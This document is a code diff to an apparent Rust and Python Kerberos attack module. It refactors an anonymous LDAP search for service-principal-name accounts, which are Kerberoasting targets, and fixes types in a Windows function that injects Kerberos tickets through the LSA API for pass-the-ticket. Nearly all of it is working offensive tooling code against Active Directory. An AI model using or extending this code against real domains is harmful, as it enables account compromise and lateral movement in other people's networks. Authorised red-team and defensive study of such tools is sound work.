@@ -148,29 +148,17 @@ impl KerberosOps {
 // ---------------------------------------------------------------------------
 
 fn ldap_enumerate_spns(domain: &str, dc_ip: &str) -> PyResult<Vec<String>> {
-    use tokio::runtime::Builder;
-
-    let domain = domain.to_string();
-    let dc_ip = dc_ip.to_string();
-
-    let rt = Builder::new_current_thread()
-        .enable_all()
-        .build()
-        .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("Tokio runtime: {}", e)))?;
-
-    rt.block_on(async move { ldap_spn_query(&domain, &dc_ip).await })
+    ldap_spn_query(domain, dc_ip)
 }
 
-async fn ldap_spn_query(domain: &str, dc_ip: &str) -> PyResult<Vec<String>> {
-    use ldap3::{LdapConnAsync, Scope, SearchEntry};
+fn ldap_spn_query(domain: &str, dc_ip: &str) -> PyResult<Vec<String>> {
+    use ldap3::{LdapConn, Scope, SearchEntry};
 
     let url = format!("ldap://{}:389", dc_ip);
-    let (mut ldap, _) = LdapConnAsync::new(&url)
-        .await
+    let mut ldap = LdapConn::new(&url)
         .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP connect: {}", e)))?;
 
     ldap.simple_bind("", "")
-        .await
         .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP bind: {}", e)))?
         .success()
         .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP bind rejected: {:?}", e)))?;
@@ -182,16 +170,11 @@ async fn ldap_spn_query(domain: &str, dc_ip: &str) -> PyResult<Vec<String>> {
         .join(",");
 
     // RFC 4533 + MS-ADTS: find enabled users with at least one SPN.
-    let filter = "(&\
-                    (objectClass=user)\
-                    (servicePrincipalName=*)\
-                    (!(UserAccountControl:1.2.840.113556.1.4.803:=2))\
-                  )";
+    let filter = "(&(objectClass=user)(servicePrincipalName=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
     let attrs = vec!["sAMAccountName", "servicePrincipalName", "distinguishedName"];
 
     let (results, _) = ldap
         .search(&base_dn, Scope::Subtree, filter, attrs)
-        .await
         .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP search: {}", e)))?
         .success()
         .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP search failed: {:?}", e)))?;
@@ -211,14 +194,16 @@ async fn ldap_spn_query(domain: &str, dc_ip: &str) -> PyResult<Vec<String>> {
                 .get("servicePrincipalName")
                 .cloned()
                 .unwrap_or_default();
+            let sam_for_filter = sam.clone();
             spns.into_iter()
-                .filter(move |_| !sam.is_empty())
+                .filter(move |_| !sam_for_filter.is_empty())
                 .map(move |spn| format!("{}/{}", sam, spn))
                 .collect::<Vec<_>>()
         })
         .collect();
 
-    ldap.unbind().await.ok();
+    ldap.unbind()
+        .map_err(|e| PyErr::new::<PyRuntimeError, _>(format!("LDAP unbind: {}", e)))?;
     Ok(candidates)
 }
 
@@ -311,13 +296,16 @@ fn parse_kirbi_der(data: &[u8]) -> PyResult<Vec<HashMap<String, String>>> {
 
 #[cfg(windows)]
 fn windows_inject_ticket(ticket_data: &[u8]) -> PyResult<bool> {
-    use windows_sys::Win32::Security::Authentication::Identity::{
-        LsaCallAuthenticationPackage, LsaConnectUntrusted, LsaLookupAuthenticationPackage,
-        KERB_SUBMIT_TKT_REQUEST,
+    use windows_sys::Win32::{
+        Foundation::HANDLE,
+        Security::Authentication::Identity::{
+            LsaCallAuthenticationPackage, LsaConnectUntrusted, LsaLookupAuthenticationPackage,
+            KERB_SUBMIT_TKT_REQUEST,
+        },
     };
 
     unsafe {
-        let mut lsa_handle: isize = 0;
+        let mut lsa_handle: HANDLE = std::ptr::null_mut();
         let status = LsaConnectUntrusted(&mut lsa_handle);
         if status != 0 {
             return Err(PyErr::new::<PyRuntimeError, _>(format!(
@@ -330,7 +318,7 @@ fn windows_inject_ticket(ticket_data: &[u8]) -> PyResult<bool> {
         let lsa_string = windows_sys::Win32::Security::Authentication::Identity::LSA_STRING {
             Length: (package_name.len() - 1) as u16,
             MaximumLength: package_name.len() as u16,
-            Buffer: package_name.as_ptr() as *mut i8,
+            Buffer: package_name.as_ptr() as *mut u8,
         };
         let mut auth_package: u32 = 0;
         let status = LsaLookupAuthenticationPackage(lsa_handle, &lsa_string, &mut auth_package);
@@ -346,7 +334,7 @@ fn windows_inject_ticket(ticket_data: &[u8]) -> PyResult<bool> {
             std::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>() + ticket_data.len();
         let mut request_buf = vec![0u8; request_size];
         let req = request_buf.as_mut_ptr() as *mut KERB_SUBMIT_TKT_REQUEST;
-        (*req).MessageType = 22u32; // KerbSubmitTicketMessage
+        (*req).MessageType = 22i32; // KerbSubmitTicketMessage
         (*req).KerbCredSize = ticket_data.len() as u32;
         (*req).KerbCredOffset =
             std::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>() as u32;
